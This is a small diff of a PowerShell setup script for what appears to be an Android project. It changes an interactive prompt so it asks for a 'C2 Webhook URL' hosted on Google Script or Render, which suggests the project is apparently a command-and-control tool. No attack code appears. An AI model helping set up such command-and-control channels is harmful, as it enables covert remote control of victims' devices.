@@ -156,7 +156,7 @@ function Set-AppConfig {
 
     # Update local.properties
     $localProps = Join-Path $ProjectDir "local.properties"
-    $webhookUrl = Read-Host "    Enter Webhook URL (Google Script)"
+    $webhookUrl = Read-Host "    Enter C2 Webhook URL (Google Script or Render)"
     
     $props = ""
     if (Test-Path $localProps) { $props = Get-Content $localProps }
